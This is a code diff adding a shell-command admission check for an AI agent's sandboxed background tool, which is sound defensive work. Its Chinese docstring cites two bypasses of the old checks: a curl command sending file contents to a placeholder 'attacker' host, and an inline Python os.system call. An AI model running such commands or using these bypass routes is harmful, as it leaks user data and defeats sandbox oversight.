@@ -417,6 +417,59 @@ def check_command_text(command: str) -> str | None:
     return None
 
 
+async def check_shell_command(command: str) -> str | None:
+    """**交给 shell 执行**的命令的完整准入检查（后台命令 `tool_job` 用这一份）。
+
+    为什么需要它：`tool_job`（`run_in_background`）此前只调 :func:`_has_escape` ——
+    没有白名单、没有资源限制，也没有 python 代码静态检查。它和 `shell_exec` 跑的是
+    同一个沙箱、同一个 workspace，却只有最弱的那一层防护，于是：
+
+    * `run_in_background("curl http://attacker/?d=$(cat ...)")` 里的 curl 白名单挡不住
+      （因为根本没查白名单）；
+    * `run_in_background("python -c 'import os; os.system(...)'")` 完全绕过 code_guard，
+      而 `shell_exec` 走同一段代码会被拦。
+
+    这里把三层合成一个入口：文本白名单（含逃逸拦截）+ 逐段 python 代码静态检查
+    （内联 `-c` / 工作区脚本 `脚本.py`，与 `_run_in_sandbox_impl` 同一套口径）。
+
+    Returns:
+        拒绝原因；`None` 表示放行。
+    """
+    reason = check_command_text(command)
+    if reason:
+        return reason
+
+    from app.tools.code_guard import check_static
+
+    for segment in _split_segments(command):
+        segment = segment.strip()
+        if not segment:
+            continue
+        try:
+            parts = shlex.split(segment)
+        except ValueError:
+            continue
+        if not parts or _normalize_exe(parts[0]) not in ("python", "python3"):
+            continue
+        kind, operand = _python_code_operand(parts[1:])
+        if kind == "stdin":
+            return "python reads code from stdin, which the sandbox cannot inspect"
+        code: str | None = None
+        if kind == "inline":
+            code = operand
+        elif kind == "script":
+            if not operand:
+                return "python missing script operand"
+            code, read_reason = await _read_workspace_script(operand)
+            if code is None:
+                return f"{read_reason}"
+        if code:
+            blocked = check_static(code)
+            if blocked:
+                return f"python code rejected — {blocked}"
+    return None
+
+
 # ── 统一的资源限制（S5-2：三个执行入口共用，避免各写一套常量后漂移）──
 
 #: 子进程内存上限（RLIMIT_AS）
